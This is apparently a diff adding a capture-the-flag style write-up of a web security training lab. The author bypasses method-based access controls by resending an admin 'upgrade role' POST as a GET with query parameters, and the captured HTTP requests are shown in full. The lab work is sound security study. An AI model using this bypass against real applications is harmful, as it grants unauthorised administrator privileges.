@@ -2,3 +2,71 @@ Lab Description:
 
 This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
 To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+
+The first thing to do is access the application using the administrator credentials, after that, i start Burp and intercept the request to the admin panel:
+
+GET /admin HTTP/1.1
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionADMIN_ID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://LAB_ID.web-security-academy.net/my-account?id=administrator
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+Nothing different or interesting.
+
+After this request, the admin panel is loaded on the browser and is evident that the upgrade/downgrade user function has to be used to promote my user to administrator, i intercepted the request to this function using the user
+Carlos as a test:
+
+POST /admin-roles HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionADMIN_ID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://LAB_ID.web-security-academy.net
+Referer: https://LAB_ID.web-security-academy.net/admin
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+username=carlos&action=upgrade
+
+This request uses the POST method, i ask myself if it can work if i use the GET method with the parameters on the query string, so i logout and login as wiener and try to send this request:
+
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionUSER_ID
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://LAB_ID.web-security-academy.net
+Referer: https://LAB_ID.web-security-academy.net/admin
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+And it works, lab solved.
